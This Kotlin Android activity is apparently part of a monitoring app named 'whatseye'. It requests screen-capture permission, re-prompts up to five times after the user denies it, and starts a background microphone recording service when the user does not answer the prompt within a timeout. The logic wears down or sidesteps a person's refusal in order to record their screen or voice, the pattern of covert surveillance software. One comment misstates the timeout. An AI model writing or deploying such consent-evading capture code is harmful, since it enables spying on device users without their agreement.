package com.example.whatseye.services

import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import androidx.core.content.ContextCompat

class CaptureActivity : Activity() {
    private lateinit var mediaProjectionManager: MediaProjectionManager
    private val handler = Handler(Looper.getMainLooper())
    private var permissionAttempts = 0
    private val maxPermissionAttempts = 5 // Limit retry attempts
    private var isPromptCanceled = false // Track if user canceled the prompt
    private var timeoutTriggered = false // Track if timeout has occurred
    private val permissionTimeoutMs = 10000L // 5 seconds timeout

    private val timeoutRunnable = Runnable {
        if (!isPromptCanceled && !timeoutTriggered) {
            timeoutTriggered = true
            startRecordingVoiceService()
           // finishAfterStart()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        // Request screen capture first
        requestScreenCapturePermission()
    }

    private fun requestScreenCapturePermission() {
        if (permissionAttempts >= maxPermissionAttempts) {
            // Only start voice service if timeout hasn't triggered and user didn't cancel
            if (!timeoutTriggered && !isPromptCanceled) {
                startRecordingVoiceService()
            }
            finishAfterStart()
            return
        }
        permissionAttempts++
        isPromptCanceled = false // Reset cancel flag for new prompt
        startActivityForResult(
            mediaProjectionManager.createScreenCaptureIntent(),
            REQUEST_CODE
        )
        // Schedule timeout for voice recording fallback
        handler.postDelayed(timeoutRunnable, permissionTimeoutMs)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        // Cancel timeout since user responded
        handler.removeCallbacks(timeoutRunnable)

        when {
            requestCode == REQUEST_CODE && resultCode == RESULT_OK && data != null -> {
                // Start screen recording service
                val serviceIntent = Intent(this, ScreenRecorderService::class.java).apply {
                    action = ScreenRecorderService.ACTION_START
                    putExtra(ScreenRecorderService.EXTRA_RESULT_CODE, resultCode)
                    putExtra(ScreenRecorderService.EXTRA_DATA, data)
                }
                ContextCompat.startForegroundService(this, serviceIntent)
                finishAfterStart()
            }
            requestCode == REQUEST_CODE -> {
                // User canceled or denied the prompt
                isPromptCanceled = true
                // Re-request permission if max attempts not reached
                requestScreenCapturePermission()
            }
        }
    }

    private fun startRecordingVoiceService() {
        val intent = Intent(this, RecordingService::class.java).apply {
            action = RecordingService.ACTION_START
        }
        ContextCompat.startForegroundService(this, intent)
    }

    private fun finishAfterStart() {
        if (!isFinishing && !isDestroyed) {
            finish()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        // Prevent leaked handlers
        handler.removeCallbacksAndMessages(null)
    }

    companion object {
        const val REQUEST_CODE = 100
    }
}